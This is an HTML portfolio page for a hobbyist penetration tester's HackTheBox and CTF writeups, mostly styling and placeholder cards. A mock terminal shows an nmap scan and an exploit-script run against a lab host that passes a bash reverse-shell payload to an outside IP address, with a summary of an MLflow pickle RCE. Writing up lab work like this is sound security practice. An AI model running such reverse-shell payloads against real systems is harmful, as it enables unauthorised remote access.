@@ -1,0 +1,902 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>21X09 // TwentyOne</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600&family=Syne:wght@700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #060608;
+    --bg2: #0d0d10;
+    --bg3: #111116;
+    --accent: #ff3c3c;
+    --accent2: #ff6b35;
+    --dim: #1a1a22;
+    --border: #1f1f2e;
+    --text: #d8d8e8;
+    --text-dim: #72728a;
+    --text-bright: #eeeef5;
+    --mono: 'JetBrains Mono', monospace;
+    --display: 'Syne', sans-serif;
+    --body: 'Inter', sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--body);
+    font-size: 17px;
+    line-height: 1.75;
+    overflow-x: hidden;
+    cursor: crosshair;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.08) 2px,
+      rgba(0,0,0,0.08) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* grid bg */
+  body::after {
+    content: '';
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background-image:
+      linear-gradient(rgba(255,60,60,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,60,60,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  a { color: var(--accent); text-decoration: none; }
+  a:hover { color: var(--accent2); }
+
+  /* NAV */
+  nav {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    z-index: 100;
+    background: rgba(6,6,8,0.92);
+    backdrop-filter: blur(8px);
+    border-bottom: 1px solid var(--border);
+    padding: 0 2rem;
+    height: 56px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .nav-logo {
+    font-family: var(--display);
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--accent);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+  }
+
+  .nav-logo span { color: var(--text-dim); }
+
+  .nav-links {
+    display: flex;
+    gap: 2rem;
+    list-style: none;
+    font-family: var(--mono);
+    font-size: 12px;
+  }
+
+  .nav-links a {
+    color: var(--text-dim);
+    letter-spacing: 1px;
+    transition: color 0.2s;
+  }
+  .nav-links a:hover { color: var(--accent); }
+
+  .status-dot {
+    display: inline-block;
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: var(--accent);
+    margin-right: 6px;
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+
+  /* HERO */
+  .hero {
+    position: relative;
+    z-index: 1;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    padding: 8rem 4rem 4rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+
+  .hero-content { max-width: 700px; }
+
+  .hero-tag {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: 4px;
+    text-transform: uppercase;
+    margin-bottom: 1.5rem;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .hero-tag::before {
+    content: '';
+    display: inline-block;
+    width: 24px;
+    height: 1px;
+    background: var(--accent);
+  }
+
+  .hero-title {
+    font-family: var(--display);
+    font-size: clamp(36px, 6vw, 72px);
+    font-weight: 900;
+    color: var(--text-bright);
+    line-height: 1.05;
+    letter-spacing: -1px;
+    margin-bottom: 0.5rem;
+  }
+
+  .hero-title .accent { color: var(--accent); }
+
+  .hero-subtitle {
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--text-dim);
+    margin-bottom: 2.5rem;
+    letter-spacing: 2px;
+  }
+
+  .hero-desc {
+    font-size: 18px;
+    color: var(--text);
+    line-height: 1.7;
+    margin-bottom: 3rem;
+    font-weight: 300;
+    max-width: 520px;
+  }
+
+  .hero-stats {
+    display: flex;
+    gap: 3rem;
+    margin-bottom: 3rem;
+  }
+
+  .stat {
+    display: flex;
+    flex-direction: column;
+  }
+
+  .stat-num {
+    font-family: var(--display);
+    font-size: 28px;
+    font-weight: 700;
+    color: var(--accent);
+  }
+
+  .stat-label {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+
+  .hero-cta {
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    padding: 12px 28px;
+    border: 1px solid var(--accent);
+    color: var(--accent);
+    font-family: var(--mono);
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    transition: all 0.2s;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .hero-cta::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: var(--accent);
+    transform: scaleX(0);
+    transform-origin: left;
+    transition: transform 0.2s;
+    z-index: -1;
+  }
+
+  .hero-cta:hover {
+    color: var(--bg);
+  }
+
+  .hero-cta:hover::before { transform: scaleX(1); }
+
+  .hero-ascii {
+    position: absolute;
+    right: 4rem;
+    top: 50%;
+    transform: translateY(-50%);
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-dim);
+    line-height: 1.4;
+    opacity: 0.4;
+    user-select: none;
+    white-space: pre;
+  }
+
+  /* SECTIONS */
+  section {
+    position: relative;
+    z-index: 1;
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 6rem 4rem;
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 3rem;
+  }
+
+  .section-tag {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--accent);
+    letter-spacing: 4px;
+    text-transform: uppercase;
+  }
+
+  .section-title {
+    font-family: var(--display);
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text-bright);
+    letter-spacing: 2px;
+  }
+
+  .section-line {
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+
+  /* WRITEUPS GRID */
+  .writeups-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+    gap: 1px;
+    background: var(--border);
+    border: 1px solid var(--border);
+  }
+
+  .writeup-card {
+    background: var(--bg);
+    padding: 1.5rem;
+    transition: background 0.2s;
+    position: relative;
+    overflow: hidden;
+    cursor: pointer;
+  }
+
+  .writeup-card::before {
+    content: '';
+    position: absolute;
+    left: 0; top: 0; bottom: 0;
+    width: 2px;
+    background: var(--accent);
+    transform: scaleY(0);
+    transition: transform 0.2s;
+  }
+
+  .writeup-card:hover { background: var(--bg2); }
+  .writeup-card:hover::before { transform: scaleY(1); }
+
+  .card-meta {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 12px;
+  }
+
+  .badge {
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    padding: 2px 8px;
+    border: 1px solid;
+  }
+
+  .badge-easy { color: #4caf8a; border-color: #4caf8a33; background: #4caf8a0d; }
+  .badge-medium { color: #ffaa33; border-color: #ffaa3333; background: #ffaa330d; }
+  .badge-hard { color: var(--accent); border-color: var(--accent)33; background: var(--accent)0d; }
+  .badge-insane { color: #cc44ff; border-color: #cc44ff33; background: #cc44ff0d; }
+
+  .badge-htb { color: #9fef00; border-color: #9fef0033; background: #9fef000d; }
+  .badge-ctf { color: #33bbff; border-color: #33bbff33; background: #33bbff0d; }
+  .badge-vuln { color: #ff6b35; border-color: #ff6b3533; background: #ff6b350d; }
+
+  .card-date {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    margin-left: auto;
+  }
+
+  .card-title {
+    font-family: var(--body);
+    font-size: 17px;
+    font-weight: 600;
+    color: var(--text-bright);
+    margin-bottom: 8px;
+    letter-spacing: 0.5px;
+  }
+
+  .card-desc {
+    font-size: 14px;
+    color: var(--text-dim);
+    line-height: 1.65;
+    margin-bottom: 16px;
+  }
+
+  .card-tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+  }
+
+  .tag {
+    font-family: var(--mono);
+    font-size: 9px;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+    padding: 2px 6px;
+    background: var(--dim);
+    text-transform: uppercase;
+  }
+
+  .card-arrow {
+    position: absolute;
+    right: 1.5rem;
+    bottom: 1.5rem;
+    font-family: var(--mono);
+    font-size: 14px;
+    color: var(--text-dim);
+    transition: color 0.2s, transform 0.2s;
+  }
+
+  .writeup-card:hover .card-arrow {
+    color: var(--accent);
+    transform: translate(2px, -2px);
+  }
+
+  /* FEATURED */
+  .featured-card {
+    border: 1px solid var(--border);
+    background: var(--bg2);
+    padding: 2rem;
+    position: relative;
+    overflow: hidden;
+    margin-bottom: 1px;
+  }
+
+  .featured-card::after {
+    content: 'FEATURED';
+    position: absolute;
+    top: 16px; right: -24px;
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 3px;
+    color: var(--bg);
+    background: var(--accent);
+    padding: 3px 32px;
+    transform: rotate(45deg);
+  }
+
+  .featured-title {
+    font-family: var(--display);
+    font-size: 24px;
+    font-weight: 700;
+    color: var(--text-bright);
+    margin-bottom: 12px;
+  }
+
+  /* TERMINAL BLOCK */
+  .terminal {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-top: 2px solid var(--accent);
+    padding: 1.5rem;
+    font-family: var(--mono);
+    font-size: 13.5px;
+    line-height: 1.9;
+    margin: 3rem 0;
+  }
+
+  .terminal-bar {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    margin-bottom: 1rem;
+    padding-bottom: 1rem;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .dot { width: 10px; height: 10px; border-radius: 50%; }
+  .dot-r { background: #ff5f56; }
+  .dot-y { background: #ffbd2e; }
+  .dot-g { background: #27c93f; }
+
+  .terminal-title {
+    margin-left: 8px;
+    color: var(--text-dim);
+    font-size: 11px;
+    letter-spacing: 1px;
+  }
+
+  .t-prompt { color: var(--accent); }
+  .t-cmd { color: var(--text-bright); }
+  .t-out { color: var(--text-dim); }
+  .t-green { color: #4caf8a; }
+  .t-yellow { color: #ffaa33; }
+  .t-red { color: var(--accent); }
+
+  /* ABOUT */
+  .about-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 2px;
+    background: var(--border);
+    border: 1px solid var(--border);
+  }
+
+  .about-block {
+    background: var(--bg);
+    padding: 2rem;
+  }
+
+  .about-block-title {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin-bottom: 1.5rem;
+  }
+
+  .skill-bar {
+    margin-bottom: 14px;
+  }
+
+  .skill-label {
+    display: flex;
+    justify-content: space-between;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text);
+    margin-bottom: 5px;
+  }
+
+  .skill-track {
+    height: 2px;
+    background: var(--dim);
+    position: relative;
+  }
+
+  .skill-fill {
+    height: 100%;
+    background: var(--accent);
+    position: relative;
+  }
+
+  .skill-fill::after {
+    content: '';
+    position: absolute;
+    right: -2px; top: -3px;
+    width: 8px; height: 8px;
+    background: var(--accent);
+    clip-path: polygon(50% 0%, 100% 100%, 0% 100%);
+  }
+
+  /* FOOTER */
+  footer {
+    position: relative;
+    z-index: 1;
+    border-top: 1px solid var(--border);
+    padding: 2rem 4rem;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .footer-logo {
+    font-family: var(--display);
+    font-size: 12px;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+  }
+
+  .footer-links {
+    display: flex;
+    gap: 2rem;
+    list-style: none;
+    font-family: var(--mono);
+    font-size: 11px;
+  }
+
+  .footer-links a { color: var(--text-dim); }
+  .footer-links a:hover { color: var(--accent); }
+
+  .footer-copy {
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+  }
+
+  /* DIVIDER */
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 0 4rem;
+  }
+
+  /* glitch effect on hover */
+  @keyframes glitch {
+    0% { clip-path: inset(40% 0 61% 0); transform: skew(-0.5deg); }
+    20% { clip-path: inset(92% 0 1% 0); transform: skew(0.5deg); }
+    40% { clip-path: inset(43% 0 1% 0); transform: skew(0.3deg); }
+    60% { clip-path: inset(25% 0 58% 0); transform: skew(-0.3deg); }
+    80% { clip-path: inset(54% 0 7% 0); transform: skew(0.1deg); }
+    100% { clip-path: inset(58% 0 43% 0); transform: skew(-0.1deg); }
+  }
+
+  .hero-title:hover .accent {
+    animation: glitch 0.3s linear infinite;
+  }
+
+  /* filter bar */
+  .filter-bar {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 2rem;
+    flex-wrap: wrap;
+  }
+
+  .filter-btn {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    padding: 5px 14px;
+    border: 1px solid var(--border);
+    background: transparent;
+    color: var(--text-dim);
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .filter-btn:hover,
+  .filter-btn.active {
+    border-color: var(--accent);
+    color: var(--accent);
+    background: var(--accent)0d;
+  }
+
+  @media (max-width: 768px) {
+    .hero { padding: 7rem 1.5rem 3rem; }
+    section { padding: 4rem 1.5rem; }
+    .hero-ascii { display: none; }
+    .about-grid { grid-template-columns: 1fr; }
+    footer { flex-direction: column; gap: 1rem; text-align: center; }
+    .hero-stats { gap: 1.5rem; }
+    nav { padding: 0 1.5rem; }
+    .nav-links { gap: 1.2rem; }
+  }
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-logo">21<span>X</span>09</div>
+  <ul class="nav-links">
+    <li><a href="#writeups">writeups</a></li>
+    <li><a href="#tools">tools</a></li>
+    <li><a href="#about">about</a></li>
+    <li><a href="https://github.com/joebrokeit" target="_blank"><span class="status-dot"></span>github</a></li>
+  </ul>
+</nav>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-content">
+    <div class="hero-tag">offensive security research</div>
+    <h1 class="hero-title">TWENTY<br><span class="accent">ONE</span></h1>
+    <p class="hero-subtitle">// 21X09 &nbsp;·&nbsp; joebrokeit &nbsp;·&nbsp; HTB / CTF</p>
+    <p class="hero-desc">Penetration testing writeups, vulnerability research, and exploit development. Breaking things to understand how they work.</p>
+    <div class="hero-stats">
+      <div class="stat">
+        <span class="stat-num" id="box-count">1</span>
+        <span class="stat-label">boxes pwned</span>
+      </div>
+      <div class="stat">
+        <span class="stat-num">1</span>
+        <span class="stat-label">writeups</span>
+      </div>
+      <div class="stat">
+        <span class="stat-num">∞</span>
+        <span class="stat-label">in progress</span>
+      </div>
+    </div>
+    <a href="#writeups" class="hero-cta">view writeups →</a>
+  </div>
+
+  <pre class="hero-ascii">
+   ██████╗  ██╗██╗  ██╗ ██████╗  █████╗
+  ╚════██╗███║╚██╗██╔╝ ██╔═████╗██╔══██╗
+   █████╔╝╚██║ ╚███╔╝  ██║██╔██║╚██████║
+  ██╔═══╝  ██║ ██╔██╗  ████╔╝██║ ╚═══██║
+  ███████╗ ██║██╔╝ ██╗ ╚██████╔╝ █████╔╝
+  ╚══════╝ ╚═╝╚═╝  ╚═╝  ╚═════╝  ╚════╝
+  </pre>
+</div>
+
+<!-- TERMINAL -->
+<section style="padding-top: 0;">
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="dot dot-r"></div>
+      <div class="dot dot-y"></div>
+      <div class="dot dot-g"></div>
+      <span class="terminal-title">21x09@kali ~ — zsh</span>
+    </div>
+    <div><span class="t-prompt">┌──(21x09@kali)-[~/htb]</span></div>
+    <div><span class="t-prompt">└─$ </span><span class="t-cmd">nmap -sC -sV -oA recon/initial target.htb</span></div>
+    <div class="t-out">Starting Nmap 7.94 ( https://nmap.org )</div>
+    <div class="t-out">PORT     STATE SERVICE VERSION</div>
+    <div><span class="t-green">80/tcp   open  http    nginx 1.24.0</span></div>
+    <div><span class="t-green">443/tcp  open  https   nginx 1.24.0</span></div>
+    <div><span class="t-yellow">5000/tcp open  mlflow  MLflow 2.14.1</span></div>
+    <div class="t-out">&nbsp;</div>
+    <div><span class="t-prompt">└─$ </span><span class="t-cmd">python3 smarthire.py -t http://models.smarthire.htb -n "test1@testers.com-model" -a admin:password -c 'bash -i >& /dev/tcp/10.10.15.38/4444 0>&1'</span></div>
+    <div><span class="t-green">[+] uploaded model/python_model.pkl</span></div>
+    <div><span class="t-green">[+] registered model v3</span></div>
+    <div><span class="t-red">[!] shell received — uid=1000(svcweb) euid=0(root)</span></div>
+  </div>
+</section>
+
+<!-- WRITEUPS -->
+<section id="writeups">
+  <div class="section-header">
+    <span class="section-tag">// 01</span>
+    <h2 class="section-title">WRITEUPS</h2>
+    <div class="section-line"></div>
+  </div>
+
+  <div class="filter-bar">
+    <button class="filter-btn active" onclick="filterCards('all', this)">all</button>
+    <button class="filter-btn" onclick="filterCards('htb', this)">hackthebox</button>
+    <button class="filter-btn" onclick="filterCards('ctf', this)">ctf</button>
+    <button class="filter-btn" onclick="filterCards('vuln', this)">vuln research</button>
+  </div>
+
+  <!-- Featured -->
+  <div class="featured-card" data-category="htb">
+    <div class="card-meta">
+      <span class="badge badge-htb">HTB</span>
+      <span class="badge badge-medium">Medium</span>
+      <span class="card-date">2026-05-17</span>
+    </div>
+    <div class="featured-title">SmartHire</div>
+    <p style="color: var(--text); font-size: 15px; margin-bottom: 1.5rem; max-width: 600px;">MLflow pickle RCE via malicious model registration + Python .pth file injection through site.addsitedir() privilege escalation to root.</p>
+    <div class="card-tags" style="margin-bottom: 1.5rem;">
+      <span class="tag">mlflow</span>
+      <span class="tag">pickle rce</span>
+      <span class="tag">pth injection</span>
+      <span class="tag">privesc</span>
+      <span class="tag">python</span>
+    </div>
+    <a href="#" class="hero-cta" style="font-size: 11px; padding: 8px 20px;">read writeup →</a>
+  </div>
+
+  <div class="writeups-grid" id="writeups-grid">
+    <!-- placeholder cards — replace with real ones -->
+    <div class="writeup-card" data-category="htb">
+      <div class="card-meta">
+        <span class="badge badge-htb">HTB</span>
+        <span class="badge badge-easy">Easy</span>
+        <span class="card-date">coming soon</span>
+      </div>
+      <div class="card-title">Next Box</div>
+      <div class="card-desc">Writeup dropping soon. Currently rooting.</div>
+      <div class="card-tags">
+        <span class="tag">linux</span>
+        <span class="tag">web</span>
+      </div>
+      <span class="card-arrow">↗</span>
+    </div>
+
+    <div class="writeup-card" data-category="ctf">
+      <div class="card-meta">
+        <span class="badge badge-ctf">CTF</span>
+        <span class="badge badge-hard">Hard</span>
+        <span class="card-date">coming soon</span>
+      </div>
+      <div class="card-title">CTF Writeup</div>
+      <div class="card-desc">Challenge writeup. Details TBD.</div>
+      <div class="card-tags">
+        <span class="tag">pwn</span>
+        <span class="tag">rev</span>
+      </div>
+      <span class="card-arrow">↗</span>
+    </div>
+
+    <div class="writeup-card" data-category="vuln">
+      <div class="card-meta">
+        <span class="badge badge-vuln">VULN</span>
+        <span class="badge badge-hard">Research</span>
+        <span class="card-date">coming soon</span>
+      </div>
+      <div class="card-title">Vulnerability Research</div>
+      <div class="card-desc">Deep dive into a CVE. Work in progress.</div>
+      <div class="card-tags">
+        <span class="tag">cve</span>
+        <span class="tag">exploit dev</span>
+      </div>
+      <span class="card-arrow">↗</span>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ABOUT -->
+<section id="about">
+  <div class="section-header">
+    <span class="section-tag">// 02</span>
+    <h2 class="section-title">ABOUT</h2>
+    <div class="section-line"></div>
+  </div>
+
+  <div class="about-grid">
+    <div class="about-block">
+      <div class="about-block-title">// profile</div>
+      <p style="font-size: 15px; color: var(--text); line-height: 1.8; margin-bottom: 1.5rem;">Handle: <span style="color: var(--accent);">TwentyOne / 21X09</span><br>
+      GitHub: <a href="https://github.com/joebrokeit">joebrokeit</a><br>
+      Focus: HTB, CTF, vulnerability research<br>
+      Stack: Python, Linux, web app pentesting</p>
+      <p style="font-size: 14px; color: var(--text-dim); line-height: 1.7;">Breaking machines for sport. Every box is a lesson. This site is a living record of that journey.</p>
+    </div>
+
+    <div class="about-block">
+      <div class="about-block-title">// skills</div>
+      <div class="skill-bar">
+        <div class="skill-label"><span>Web App Pentesting</span><span>▓▓▓▓▓▓▒▒░░</span></div>
+        <div class="skill-track"><div class="skill-fill" style="width: 65%"></div></div>
+      </div>
+      <div class="skill-bar">
+        <div class="skill-label"><span>Linux Privesc</span><span>▓▓▓▓▓▓▓▒░░</span></div>
+        <div class="skill-track"><div class="skill-fill" style="width: 70%"></div></div>
+      </div>
+      <div class="skill-bar">
+        <div class="skill-label"><span>Python Exploit Dev</span><span>▓▓▓▓▓▒▒░░░</span></div>
+        <div class="skill-track"><div class="skill-fill" style="width: 55%"></div></div>
+      </div>
+      <div class="skill-bar">
+        <div class="skill-label"><span>Network Recon</span><span>▓▓▓▓▓▓▒▒░░</span></div>
+        <div class="skill-track"><div class="skill-fill" style="width: 60%"></div></div>
+      </div>
+      <div class="skill-bar">
+        <div class="skill-label"><span>Active Directory</span><span>▓▓▓▒▒░░░░░</span></div>
+        <div class="skill-track"><div class="skill-fill" style="width: 35%"></div></div>
+      </div>
+    </div>
+
+    <div class="about-block">
+      <div class="about-block-title">// tools</div>
+      <div style="display: flex; flex-wrap: wrap; gap: 6px;">
+        <span class="tag" style="font-size: 11px; padding: 4px 10px;">nmap</span>
+        <span class="tag" style="font-size: 11px; padding: 4px 10px;">burpsuite</span>
+        <span class="tag" style="font-size: 11px; padding: 4px 10px;">metasploit</span>
+        <span class="tag" style="font-size: 11px; padding: 4px 10px;">gobuster</span>
+        <span class="tag" style="font-size: 11px; padding: 4px 10px;">ffuf</span>
+        <span class="tag" style="font-size: 11px; padding: 4px 10px;">linpeas</span>
+        <span class="tag" style="font-size: 11px; padding: 4px 10px;">pwncat</span>
+        <span class="tag" style="font-size: 11px; padding: 4px 10px;">bloodhound</span>
+        <span class="tag" style="font-size: 11px; padding: 4px 10px;">impacket</span>
+        <span class="tag" style="font-size: 11px; padding: 4px 10px;">sqlmap</span>
+        <span class="tag" style="font-size: 11px; padding: 4px 10px;">wireshark</span>
+        <span class="tag" style="font-size: 11px; padding: 4px 10px;">ghidra</span>
+      </div>
+    </div>
+
+    <div class="about-block">
+      <div class="about-block-title">// platforms</div>
+      <div style="display: flex; flex-direction: column; gap: 12px;">
+        <a href="https://hackthebox.com" target="_blank" style="display: flex; align-items: center; justify-content: space-between; padding: 10px 14px; border: 1px solid var(--border); color: var(--text); transition: border-color 0.2s;" onmouseover="this.style.borderColor='#9fef00'" onmouseout="this.style.borderColor='var(--border)'">
+          <span style="font-family: var(--mono); font-size: 12px;">HackTheBox</span>
+          <span style="font-family: var(--mono); font-size: 10px; color: #9fef00;">↗ profile</span>
+        </a>
+        <a href="https://github.com/joebrokeit" target="_blank" style="display: flex; align-items: center; justify-content: space-between; padding: 10px 14px; border: 1px solid var(--border); color: var(--text); transition: border-color 0.2s;" onmouseover="this.style.borderColor='var(--accent)'" onmouseout="this.style.borderColor='var(--border)'">
+          <span style="font-family: var(--mono); font-size: 12px;">GitHub // joebrokeit</span>
+          <span style="font-family: var(--mono); font-size: 10px; color: var(--accent);">↗ repos</span>
+        </a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="footer-logo">21X09</div>
+  <ul class="footer-links">
+    <li><a href="https://github.com/joebrokeit" target="_blank">github</a></li>
+    <li><a href="#writeups">writeups</a></li>
+  </ul>
+  <div class="footer-copy">// all systems compromised</div>
+</footer>
+
+<script>
+  function filterCards(cat, btn) {
+    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    document.querySelectorAll('.writeup-card, .featured-card').forEach(card => {
+      if (cat === 'all' || card.dataset.category === cat) {
+        card.style.display = '';
+      } else {
+        card.style.display = 'none';
+      }
+    });
+  }
+
+  // Typing cursor effect on hero subtitle
+  const sub = document.querySelector('.hero-subtitle');
+  const original = sub.textContent;
+  sub.textContent = '';
+  let i = 0;
+  function typeNext() {
+    if (i < original.length) {
+      sub.textContent += original[i++];
+      setTimeout(typeNext, 40 + Math.random() * 30);
+    } else {
+      sub.innerHTML += '<span style="animation: pulse 1s infinite; color: var(--accent);">█</span>';
+    }
+  }
+  setTimeout(typeNext, 600);
+</script>
+</body>
+</html>
